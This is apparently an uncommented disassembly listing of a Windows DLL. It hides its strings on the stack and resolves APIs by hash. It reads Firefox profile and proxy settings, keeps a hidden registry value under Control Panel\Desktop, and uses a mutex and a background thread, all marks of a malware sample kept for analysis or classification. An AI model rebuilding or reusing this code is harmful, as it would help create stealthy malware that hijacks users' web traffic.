mov al [ ebp - 0x1 ]
pop esi
leave
retn
push edi
mov edi [ lstrcmpiA@IAT ]
push ebx
mov ecx [ esi ]
push 0x6
push r--data
call sub_1000404a
mov ecx [ esi ]
push 0x7
push r--data
mov [ ebp - 0x14 ] eax
call sub_1000404a
mov ecx [ esi ]
push 0x6
push r--data
mov [ ebp - 0x10 ] eax
call sub_1000404a
mov ecx [ esi ]
push 0x7
push r--data
mov [ ebp - 0xc ] eax
call sub_1000404a
push [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
push [ esi + 0x8 ]
call edi
test eax eax
jne r-xdata
inc eax
inc [ esi + 0xc ]
mov [ esi + 0x8 ] eax
jmp r-xdata
push [ ebp - 0x10 ]
push [ esi + 0x8 ]
call edi
test eax eax
jne r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov eax [ esi + 0xc ]
cmp eax [ esi + 0x10 ]
jb r-xdata
push [ ebp - 0xc ]
push [ esi + 0x8 ]
call edi
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
call sub_100042a1
jmp r-xdata
push 0x12
call sub_1000461b
pop ecx
test eax eax
je r-xdata
mov ecx ebx
call sub_10004473
push ebx
call sub_10004632
pop ecx
mov eax [ esi + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
pop ebx
pop edi
push [ ebp - 0x8 ]
push [ esi + 0x8 ]
call edi
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
call sub_100042e4
jmp r-xdata
push [ esi + 0x8 ]
call [ lstrlenA@IAT ]
push [ ebp - 0x8 ]
add [ esi + 0xc ] eax
add [ esi + 0x8 ] eax
call sub_1000465c
push [ ebp - 0xc ]
call sub_1000465c
push [ ebp - 0x10 ]
call sub_1000465c
push [ ebp - 0x14 ]
call sub_1000465c
add esp 0x10
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
xor eax eax
mov ecx eax
call sub_10004263
jmp r-xdata
push [ esi + 0x8 ]
mov ecx esi
call sub_10005857
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov [ esi + 0x4 ] eax
jmp r-xdata
sub_10005a6c
push ebp
mov ebp esp
push ebx
push esi
push edi
push [ ebp + 0xc ]
mov esi ecx
push [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
call sub_100042e9
push 0x401
call sub_10004653
pop ecx
mov ebx eax
call [ GetLastError@IAT ]
mov ecx [ esi + 0x4 ]
push eax
call sub_10005b5f
push eax
push r--data
push ebx
call [ wsprintfA@IAT ]
mov edi [ esi + 0x4 ]
add esp 0x10
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0x8
mov ecx edi
call sub_10004473
push edi
call sub_10004632
pop ecx
sub_10005ad0
push ebp
mov ebp esp
push esi
push 0xc
mov esi ecx
call sub_1000461b
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_10003e40
jmp r-xdata
mov ecx [ ebp + 0x8 ]
and [ esi + 0xc ] 0x0
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
mov eax [ ebp + 0xc ]
push eax
push ecx
mov [ esi + 0x10 ] eax
mov [ esi + 0x8 ] ecx
call sub_10005831
pop ecx
pop ecx
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10005b13
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov ecx edi
call sub_10004473
push edi
call sub_10004632
pop ecx
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
pop edi
pop esi
retn
mov ecx edi
call sub_10004096
push edi
call sub_10004632
pop ecx
sub_10005b6b
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebp
retn 0x4
push eax
call sub_1000465c
pop ecx
sub_10005b8a
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
pop esi
pop ebp
retn 0x4
push eax
call sub_1000465c
pop ecx
sub_10005ba9
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi + 0xc ] eax
pop esi
pop ebp
retn 0x4
push eax
call sub_1000465c
pop ecx
sub_10005bc8
push esi
mov esi ecx
mov eax [ esi ]
push 0x0
call [ eax + 0x14 ]
mov eax [ esi ]
push 0x0
mov ecx esi
call [ eax + 0x1c ]
mov eax [ esi ]
push 0x0
mov ecx esi
call [ eax + 0x18 ]
pop esi
retn
sub_10005bf1
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10005bc8
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10004632
pop ecx
sub_10005c28
push ebp
mov ebp esp
sub esp 0x7c
push ebx
push esi
push edi
mov esi 0x208
push esi
call sub_10004653
pop ecx
push 0x0
push 0x1a
push eax
push 0x0
mov [ ebp - 0x4 ] eax
call [ SHGetSpecialFolderPathW@IAT ]
push esi
call sub_10004653
push 0x4d
pop ecx
push 0x6f
mov [ ebp - 0x38 ] cx
pop ecx
push 0x7a
mov [ ebp - 0x36 ] cx
pop ecx
push 0x69
pop ebx
push 0x6c
mov [ ebp - 0x34 ] cx
mov ecx ebx
mov [ ebp - 0x32 ] cx
pop ecx
push 0x61
mov [ ebp - 0x30 ] cx
mov [ ebp - 0x2e ] cx
pop ecx
push 0x46
mov [ ebp - 0x2c ] cx
xor ecx ecx
mov [ ebp - 0x2a ] cx
pop ecx
push 0x72
mov [ ebp - 0x28 ] cx
mov ecx ebx
mov [ ebp - 0x26 ] cx
pop ecx
push 0x65
mov [ ebp - 0x24 ] cx
pop ecx
push 0x66
mov [ ebp - 0x22 ] cx
pop ecx
push 0x6f
mov [ ebp - 0x20 ] cx
pop ecx
push 0x78
mov [ ebp - 0x1e ] cx
pop ecx
push 0x70
mov [ ebp - 0x1c ] cx
xor ecx ecx
mov [ ebp - 0x1a ] cx
pop ecx
push 0x72
mov [ ebp - 0x7c ] cx
pop ecx
push 0x6f
mov [ ebp - 0x7a ] cx
pop ecx
push 0x66
mov [ ebp - 0x78 ] cx
pop ecx
mov [ ebp - 0x76 ] cx
push 0x6c
mov ecx ebx
mov [ ebp - 0x74 ] cx
pop ecx
push 0x65
mov [ ebp - 0x72 ] cx
pop ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x70 ] cx
push 0x73
pop ecx
push 0x2e
mov [ ebp - 0x6e ] cx
pop ecx
mov [ ebp - 0x6c ] cx
push 0x6e
mov edi [ wsprintfW@IAT ]
mov ecx ebx
mov [ ebp - 0x6a ] cx
pop ecx
mov [ ebp - 0x68 ] cx
mov ecx ebx
mov [ ebp - 0x66 ] cx
xor ecx ecx
mov [ ebp - 0x64 ] cx
lea ecx [ ebp - 0x7c ]
push ecx
lea ecx [ ebp - 0x28 ]
push ecx
lea ecx [ ebp - 0x38 ]
push ecx
push [ ebp - 0x4 ]
push r--data
push eax
call edi
push 0x50
pop eax
push 0x72
mov [ ebp - 0x4c ] ax
pop eax
push 0x6f
mov [ ebp - 0x4a ] ax
pop eax
push 0x66
mov [ ebp - 0x48 ] ax
pop eax
push 0x6c
mov [ ebp - 0x46 ] ax
pop eax
push 0x65
mov [ ebp - 0x42 ] ax
pop eax
push 0x30
mov [ ebp - 0x40 ] ax
pop eax
mov [ ebp - 0x3e ] ax
xor eax eax
push 0x50
mov [ ebp - 0x3c ] ax
pop eax
push 0x61
mov [ ebp - 0x18 ] ax
pop eax
push 0x74
mov [ ebp - 0x16 ] ax
pop eax
mov [ ebp - 0x14 ] ax
push 0x68
pop eax
mov [ ebp - 0x12 ] ax
xor eax eax
push esi
mov [ ebp - 0x44 ] bx
mov [ ebp - 0x10 ] ax
call sub_10004653
add esp 0x20
push [ ebp - 0x8 ]
mov esi eax
push 0x104
push esi
push r--data
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call [ GetPrivateProfileStringW@IAT ]
push [ ebp - 0x8 ]
call sub_1000465c
push 0x2f
push esi
call sub_10004165
xor ebx ebx
add esp 0xc
cmp eax ebx
je r-xdata
push 0x70
pop eax
push 0x72
mov [ ebp - 0x60 ] ax
pop eax
push 0x65
mov [ ebp - 0x5e ] ax
pop eax
push 0x66
mov [ ebp - 0x5c ] ax
pop eax
push 0x73
mov [ ebp - 0x5a ] ax
pop eax
push 0x2e
mov [ ebp - 0x58 ] ax
pop eax
push 0x6a
mov [ ebp - 0x56 ] ax
pop eax
push 0x73
mov [ ebp - 0x54 ] ax
pop eax
mov [ ebp - 0x52 ] ax
xor eax eax
mov [ ebp - 0x50 ] ax
lea eax [ ebp - 0x60 ]
push eax
push esi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
push [ ebp - 0x4 ]
push r--data
push [ ebp - 0x4 ]
call edi
push esi
call sub_1000465c
add esp 0x20
push ebx
push ebx
push 0x3
push ebx
push 0x1
push 0x80000000
push [ ebp - 0x4 ]
xor edi edi
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
sub eax esi
push 0x5c
sar eax 0x1
pop ecx
mov [ esi + eax * 2 ] cx
push [ ebp - 0x4 ]
call sub_1000465c
pop ecx
mov eax edi
pop edi
pop esi
pop ebx
leave
retn
push ebx
push esi
call [ GetFileSize@IAT ]
push eax
mov [ ebp - 0xc ] eax
call sub_10004653
pop ecx
push ebx
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x8 ] ebx
push edi
push esi
call [ ReadFile@IAT ]
push esi
call [ CloseHandle@IAT ]
sub_10005e9b
push ebp
mov ebp esp
sub esp 0x48
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x30 ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x30 ] 0x7774656e
mov [ ebp - 0x2c ] 0x2e6b726f
mov [ ebp - 0x28 ] 0x786f7270
mov [ ebp - 0x24 ] 0x74682e79
mov [ ebp - 0x20 ] 0x7074
mov [ ebp - 0x1e ] 0x0
call sub_1000418a
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
leave
retn 0x4
push edi
push r--data
push eax
call sub_1000418a
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
pop edi
push esi
add edi 0x3
push r--data
push edi
call sub_1000418a
mov esi eax
sub esi edi
lea eax [ esi + 0x1 ]
push eax
call sub_10004653
push esi
push edi
push eax
mov [ ebp - 0x4 ] eax
call sub_100041e0
lea eax [ ebp - 0x48 ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x48 ] 0x7774656e
mov [ ebp - 0x44 ] 0x2e6b726f
mov [ ebp - 0x40 ] 0x786f7270
mov [ ebp - 0x3c ] 0x74682e79
mov [ ebp - 0x38 ] 0x705f7074
mov [ ebp - 0x34 ] 0x74726f
call sub_1000418a
add esp 0x20
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_1000465c
pop ecx
pop esi
push r--data
push eax
call sub_1000418a
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push ebx
add edi 0x2
push r--data
push edi
call sub_1000418a
mov esi eax
sub esi edi
lea eax [ esi + 0x1 ]
push eax
call sub_10004653
push esi
mov ebx eax
push edi
push ebx
call sub_100041e0
push 0x104
mov [ ebp - 0x1c ] 0x70747468
mov [ ebp - 0x18 ] 0x7474683d
mov [ ebp - 0x14 ] 0x2f2f3a70
mov [ ebp - 0x10 ] 0x253a7325
mov [ ebp - 0xc ] 0x73
call sub_10004653
push ebx
push [ ebp - 0x4 ]
lea ecx [ ebp - 0x1c ]
push ecx
push eax
mov [ ebp - 0x8 ] eax
call [ wsprintfA@IAT ]
push ebx
call sub_1000465c
add esp 0x30
pop ebx
sub_10005ff4
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10005be6
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10004632
pop ecx
sub_10006019
push ebp
mov ebp esp
sub esp 0x3c
push ebx
push esi
push edi
lea eax [ ebp - 0x8 ]
push eax
push 0x1
xor ebx ebx
push ebx
lea eax [ ebp - 0x3c ]
push eax
push 0x80000001
mov [ ebp - 0x3c ] 0x746e6f43
mov [ ebp - 0x38 ] 0x206c6f72
mov [ ebp - 0x34 ] 0x656e6150
mov [ ebp - 0x30 ] 0x65445c6c
mov [ ebp - 0x2c ] 0x6f746b73
mov [ ebp - 0x28 ] 0x70
mov [ ebp - 0x8 ] ebx
call [ RegOpenKeyExA@IAT ]
mov esi [ RegQueryValueExA@IAT ]
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push ebx
lea eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x8 ]
mov [ ebp - 0x24 ] 0x6c656557
mov [ ebp - 0x20 ] 0x49726353
mov [ ebp - 0x1c ] 0x74696e
mov [ ebp - 0x4 ] ebx
call esi
push [ ebp - 0x4 ]
call sub_10004653
pop ecx
mov edi eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push ebx
push ebx
lea eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x8 ]
call esi
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x18 ]
push eax
push edi
mov [ ebp - 0x18 ] 0x69736142
mov [ ebp - 0x14 ] 0x2063
mov [ ebp - 0x12 ] bl
xor esi esi
call sub_1000418a
pop ecx
pop ecx
test eax eax
je r-xdata
push edi
call sub_1000465c
pop ecx
pop edi
mov eax esi
pop esi
pop ebx
leave
retn 0x4
push [ ebp - 0x4 ]
call sub_10004653
mov [ ebp - 0x10 ] eax
pop ecx
lea eax [ ebp - 0x18 ]
push eax
call [ lstrlenA@IAT ]
mov esi eax
mov eax [ ebp - 0x4 ]
sub eax esi
push eax
lea eax [ esi + edi ]
push eax
push [ ebp - 0x10 ]
call sub_100041e0
push 0x1
call sub_1000461b
add esp 0x10
cmp eax ebx
je r-xdata
mov [ ebp - 0xc ] ebx
mov ecx eax
call sub_10004715
mov [ ebp - 0xc ] eax
jmp r-xdata
push [ ebp - 0x10 ]
call sub_1000465c
pop ecx
call sub_10003db3
push [ ebp - 0xc ]
call sub_10004632
pop ecx
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
sub eax esi
push eax
push [ ebp - 0x10 ]
call sub_10003df6
mov ecx [ ebp - 0xc ]
mov esi eax
cmp ecx ebx
je r-xdata
sub_10006165
push ebp
mov ebp esp
sub esp 0x18
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] 0x0
call sub_10005c28
mov edi eax
test edi edi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
leave
retn
push ebx
push edi
mov ecx esi
call sub_10005e9b
push edi
mov ebx eax
call sub_1000465c
pop ecx
test ebx ebx
je r-xdata
mov eax [ esi ]
push ebx
mov ecx esi
call [ eax + 0x14 ]
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
call sub_10006019
mov edi eax
mov [ ebp - 0x18 ] edi
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x1
pop ebx
push 0x3a
push edi
call sub_10004147
mov ebx eax
pop ecx
pop ecx
mov [ ebp - 0xc ] ebx
test ebx ebx
je r-xdata
push [ ebp - 0x18 ]
call sub_1000465c
pop ecx
sub ebx edi
lea eax [ ebx + 0x1 ]
push eax
call sub_10004653
sub edi [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
add eax edi
push eax
call sub_10004653
push ebx
push [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
push [ ebp - 0x10 ]
call sub_100041e0
mov eax [ ebp - 0x8 ]
lea eax [ edi + eax - 0x1 ]
push eax
mov eax [ ebp - 0xc ]
inc eax
push eax
push [ ebp - 0x14 ]
call sub_100041e0
mov eax [ esi ]
add esp 0x20
push [ ebp - 0x10 ]
mov ecx esi
call [ eax + 0x18 ]
push [ ebp - 0x14 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x1c ]
sub_10006250
push r--data
push 0x0
push 0x0
call [ CreateMutexA@IAT ]
call [ GetLastError@IAT ]
cmp eax 0xb7
je r-xdata
xor eax eax
retn 0x4
push esi
push 0x21
call sub_1000461b
pop ecx
test eax eax
je r-xdata
xor esi esi
mov ecx eax
call sub_10004a38
mov esi eax
jmp r-xdata
mov ecx esi
call sub_100055c8
init
push esi
xor esi esi
push esi
push esi
push esi
push sub_10006250
push esi
push esi
call [ CreateThread@IAT ]
cmp eax esi
pop esi
je r-xdata
retn
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
sub_100017cc
mov eax [ fs : 0x30 ]
retn
sub_10001810
mov eax [ rw-data ]
test eax eax
jne r-xdata
retn
push 0x4b1ffe8e
call sub_100017d3
pop ecx
mov [ rw-data ] eax
sub_100018a8
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea edx [ ecx - 0x1 ]
xor eax eax
cmp edx 0x242
ja r-xdata
pop ebp
retn
mov eax [ ecx * 4 + rw-data ]
sub_10001acc
push ebp
mov ebp esp
push 0x0
push 0x9
push 0x1
push 0x11
call sub_100019c6
add esp 0x10
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001ae6
push ebp
mov ebp esp
push 0x0
push 0x14
push 0x1
push 0x14
call sub_100019c6
add esp 0x10
pop ebp
jmp eax
sub_10001afc
push ebp
mov ebp esp
push 0x0
push 0xd
push 0x1
push 0x16
call sub_100019c6
add esp 0x10
pop ebp
jmp eax
sub_10001b3e
push ebp
mov ebp esp
push 0x0
push 0xe
push 0x1
push 0x1a
call sub_100019c6
add esp 0x10
pop ebp
jmp eax
sub_10001b54
push ebp
mov ebp esp
push 0x0
push 0x36
push 0x1
push 0x23
call sub_100019c6
add esp 0x10
pop ebp
jmp eax
sub_10001b6a
push ebp
mov ebp esp
push 0x0
push 0x34
push 0x1
push 0x25
call sub_100019c6
add esp 0x10
pop ebp
jmp eax
sub_10001bcf
push ebp
mov ebp esp
push 0x0
push 0x8
push 0x1
push 0x2d
call sub_100019c6
add esp 0x10
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001be9
push ebp
mov ebp esp
push 0x0
push 0x1a
push 0x1
push 0x2e
call sub_100019c6
add esp 0x10
pop ebp
jmp eax
sub_10001bff
push ebp
mov ebp esp
push 0x0
push 0x19
push 0x1
push 0x2f
call sub_100019c6
add esp 0x10
pop ebp
jmp eax
sub_10001c4a
push ebp
mov ebp esp
push 0x0
push 0x10
push 0x1
push 0x40
call sub_100019c6
add esp 0x10
pop ebp
jmp eax
sub_10001ca0
push 0x0
push 0x24
push 0x1
push 0x6d
call sub_100019c6
add esp 0x10
jmp eax
sub_1000229f
push ebp
mov ebp esp
pop ebp
jmp sub_100021d8
sub_100026a0
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov [ esi ] r--data
pop esi
retn
push eax
call sub_100021d8
pop ecx
sub_1000316e
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10002e61
mov ecx esi
pop esi
jmp sub_100026a0
sub_100034a0
call sub_100017cc
mov eax [ eax + 0x1d4 ]
retn
sub_100034ac
mov eax r--data
retn
sub_10004205
xor eax eax
retn
sub_10004294
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_100042a1
mov [ ecx + 0x10 ] 0x1
retn
sub_100042d7
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0xc ] eax
pop ebp
retn 0x4
sub_100042e4
mov [ ecx + 0x11 ] 0x1
retn
sub_1000449d
push [ ecx ]
call sub_1000465c
pop ecx
retn
sub_10004538
push esi
mov esi ecx
call sub_100044f0
mov eax esi
pop esi
retn
sub_10004715
mov eax ecx
retn
sub_10004ad1
push esi
mov esi ecx
push [ esi + 0x10 ]
call sub_1000465c
pop ecx
mov ecx [ esi ]
push 0x2c
push r--data
call sub_1000404a
mov [ esi + 0x10 ] eax
pop esi
retn
sub_10004d12
xor eax eax
cmp [ ecx + 0x1c ] eax
je r-xdata
retn
mov ecx [ ecx + 0x1c ]
mov eax [ ecx ]
jmp [ eax + 0x8 ]
sub_10004d22
xor eax eax
cmp [ ecx + 0x1c ] eax
je r-xdata
retn
mov ecx [ ecx + 0x1c ]
mov eax [ ecx ]
jmp [ eax + 0xc ]
sub_10004d32
xor eax eax
cmp [ ecx + 0x1c ] eax
je r-xdata
retn
mov ecx [ ecx + 0x1c ]
mov eax [ ecx ]
jmp [ eax + 0x10 ]
sub_10005a64
mov ecx [ ecx + 0x4 ]
jmp sub_10005b5f
sub_10005b4b
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
retn
sub_10005b5f
mov eax [ ecx + 0x4 ]
retn
sub_10005b63
mov eax [ ecx + 0x8 ]
retn
sub_10005b67
mov eax [ ecx + 0xc ]
retn
sub_10005be6
mov [ ecx ] r--data
jmp sub_10005bc8
sub_10005c16
push esi
mov esi ecx
call sub_10005b4b
mov [ esi ] r--data
mov eax esi
pop esi
retn
_start
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
xor eax eax
inc eax
pop ebp
retn 0xc
push [ ebp + 0x8 ]
call [ DisableThreadLibraryCalls@IAT ]
ObtainUserAgentString
jmp [ ObtainUserAgentString@IAT ]
WSACleanup
jmp [ WSACleanup@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
gethostname
jmp [ gethostname@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
